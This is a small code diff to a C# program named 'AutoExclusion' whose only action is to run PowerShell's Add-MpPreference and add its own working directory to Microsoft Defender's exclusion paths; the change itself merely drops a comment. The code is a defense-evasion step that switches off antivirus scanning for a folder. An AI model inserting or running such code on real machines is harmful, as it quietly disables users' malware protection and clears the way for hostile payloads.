@@ -6,7 +6,7 @@ namespace AutoExclusion
     {
         static void Main(string[] args)
         {
-          PowerShell.Create().AddCommand("Add-MpPreference").AddParameter("ExclusionPath", Environment.CurrentDirectory).Invoke(); // Invoke the command
+          PowerShell.Create().AddCommand("Add-MpPreference").AddParameter("ExclusionPath", Environment.CurrentDirectory).Invoke();
         }
     }
 }
